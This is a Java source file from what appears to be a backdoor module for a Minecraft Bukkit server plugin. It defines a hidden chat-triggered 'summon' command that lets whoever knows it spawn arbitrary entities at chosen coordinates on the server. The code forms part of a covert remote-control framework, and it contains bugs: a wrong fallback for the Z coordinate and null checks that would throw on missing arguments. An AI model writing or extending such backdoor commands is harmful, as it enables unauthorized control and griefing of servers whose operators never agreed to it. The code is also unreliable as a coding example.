package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.Location;
import org.bukkit.World;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

@RegisterCommand(displayName = "summon", aliases = {"summon", "su"})
public class SummonCommand extends Command {

    public SummonCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {
        World world = event.getPlayer().getWorld();
        Player player = event.getPlayer();
        Location playerLocation = player.getLocation();

        EntityType entity;
        try {
            entity = EntityType.valueOf(args.get(0));
        } catch (Exception e) {
            Main.logger.log("Failed to get entity type");
            if (args.get(1) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a entity type");
            }
            return;
        }

        double blockX;
        try {
            blockX = Double.parseDouble(args.get(1));
        } catch (Exception e) {
            Main.logger.log("Failed to get blockX");
            if (args.get(1) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a double");
            }
            Main.logger.log("Defaulting to player block X");
            blockX = playerLocation.getBlockX();
        }

        double blockY;
        try {
            blockY = Double.parseDouble(args.get(2));
        } catch (Exception e) {
            Main.logger.log("Failed to get blockY");
            if (args.get(2) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a double");
            }
            Main.logger.log("Defaulting to player block Y");
            blockY = playerLocation.getBlockY();
        }

        double blockZ;
        try {
            blockZ = Double.parseDouble(args.get(3));
        } catch (Exception e) {
            Main.logger.log("Failed to get blockZ");
            if (args.get(3) == null) {
                Main.logger.log(NOT_ENOUGH_ARGS);
            } else {
                Main.logger.log("That is not a double");
            }
            Main.logger.log("Defaulting to player block Z");
            blockZ = playerLocation.getBlockX();
        }

        Location summonLocation = new Location(world, blockX, blockY, blockZ);
        try {
            world.spawnEntity(summonLocation, entity);
        } catch (Exception e) {
            Main.logger.log("Failed to summon entity");
            return;
        }
    }
}
